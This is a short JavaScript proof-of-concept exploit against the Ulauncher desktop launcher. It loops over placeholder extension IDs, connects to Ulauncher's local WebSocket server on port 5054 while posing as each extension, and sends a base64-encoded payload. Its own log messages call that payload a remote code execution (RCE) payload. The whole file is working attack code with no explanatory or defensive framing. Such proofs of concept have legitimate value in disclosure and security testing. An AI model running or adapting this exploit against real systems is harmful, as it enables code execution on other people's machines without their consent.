(async () => {
    const extensionsIds = __EXTENSIONS_IDS__;
    const payload = __PAYLOAD__;

    let payloadSent = false;
    for (const extensionId of extensionsIds) {
        await new Promise((resolve) => {
            const client = new WebSocket(`ws://127.0.0.1:5054/${extensionId}`);
            client.addEventListener("close", () => resolve());
            client.addEventListener("open", () => {
                try {
                    console.log(`Connection established (as ${extensionId}), sending payload...`);
                    client.send(Uint8Array.from(atob(payload), (c) => c.charCodeAt(0)));
                    payloadSent = true;
                } finally {
                    client.close();
                }
            });
        });
        if (payloadSent) {
            console.log('Done. The RCE payload has been sent!');
            return;
        }
    }
    console.log('Done. No extensions found on Ulauncher to send the RCE payload... :(');
})();
